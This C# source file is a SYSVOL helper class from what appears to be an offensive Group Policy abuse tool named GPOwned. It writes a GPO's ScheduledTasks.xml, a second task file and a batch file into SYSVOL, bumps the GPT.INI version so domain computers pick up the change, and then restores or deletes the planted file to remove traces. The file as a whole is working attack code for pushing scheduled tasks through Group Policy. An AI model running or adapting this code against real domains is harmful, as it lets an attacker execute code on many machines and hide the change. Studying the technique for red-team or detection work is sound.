using System;
using System.Collections.Generic;
using System.IO;
using System.Text;

namespace GPOwned.Shared
{
    public static class SysvolHelper
    {
        public static string ScheduledTasksPath(string domain, string guid)
        {
            return @"\\" + domain + @"\SYSVOL\" + domain + @"\Policies\" + guid +
                   @"\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml";
        }

        public static string WsaddPath(string domain, string guid)
        {
            return @"\\" + domain + @"\SYSVOL\" + domain + @"\Policies\" + guid +
                   @"\Machine\Preferences\ScheduledTasks\wsadd.xml";
        }

        public static string AddBatPath(string domain, string guid)
        {
            return @"\\" + domain + @"\SYSVOL\" + domain + @"\Policies\" + guid +
                   @"\Machine\Preferences\ScheduledTasks\add.bat";
        }

        public static string GptIniPath(string domain, string guid)
        {
            return @"\\" + domain + @"\SYSVOL\" + domain + @"\Policies\" + guid + @"\GPT.INI";
        }

        public static bool DeployXml(string content, string targetPath, Encoding encoding)
        {
            string dir = Path.GetDirectoryName(targetPath);
            Directory.CreateDirectory(dir);

            bool backedUp = false;
            if (File.Exists(targetPath))
            {
                File.Copy(targetPath, targetPath + ".old", true);
                backedUp = true;
                Output.Gray("Existing ScheduledTasks.xml backed up in SYSVOL.");
            }
            else
            {
                Output.Green("Created ScheduledTasks.xml in SYSVOL.");
            }

            File.WriteAllText(targetPath, content, encoding);
            return backedUp;
        }

        public static void DeploySecondTaskFiles(string domain, string guid, string wsaddContent, string addBatContent)
        {
            string dir = Path.GetDirectoryName(WsaddPath(domain, guid));
            Directory.CreateDirectory(dir);

            File.WriteAllText(WsaddPath(domain, guid), wsaddContent, Encoding.Unicode);
            File.WriteAllText(AddBatPath(domain, guid), addBatContent, Encoding.ASCII);
            Output.Green("Created wsadd.xml and add.bat in SYSVOL.");
        }

        public static void PatchXml(string filePath, Dictionary<string, string> tokens, Encoding encoding)
        {
            string content = File.ReadAllText(filePath, encoding);
            foreach (var kv in tokens)
                content = content.Replace(kv.Key, kv.Value);
            File.WriteAllText(filePath, content, encoding);
        }

        public static bool UpdateGptIni(string domain, string guid)
        {
            string path = GptIniPath(domain, guid);
            try
            {
                string[] lines = File.ReadAllLines(path, Encoding.ASCII);
                for (int i = 0; i < lines.Length; i++)
                {
                    if (lines[i].StartsWith("Version", StringComparison.OrdinalIgnoreCase))
                    {
                        int sep = lines[i].IndexOf('=');
                        if (sep >= 0)
                        {
                            int ver;
                            if (int.TryParse(lines[i].Substring(sep + 1).Trim(), out ver))
                            {
                                lines[i] = "Version=" + (ver + 1);
                                File.WriteAllLines(path, lines, Encoding.ASCII);
                                return true;
                            }
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Output.Red("Failed to update GPT.INI: " + ex.Message);
            }
            return false;
        }

        public static void RestoreScheduledTasks(string domain, string guid, bool wasBackedUp)
        {
            string main   = ScheduledTasksPath(domain, guid);
            string backup = main + ".old";

            try { File.Delete(main); } catch { }

            if (wasBackedUp && File.Exists(backup))
            {
                try
                {
                    File.Move(backup, main);
                    Output.Green("ScheduledTasks.xml restored from backup.");
                }
                catch (Exception ex)
                {
                    Output.Red("Failed to restore ScheduledTasks.xml: " + ex.Message);
                }
            }
            else
            {
                Output.Green("ScheduledTasks.xml removed from SYSVOL.");
            }
        }
    }
}
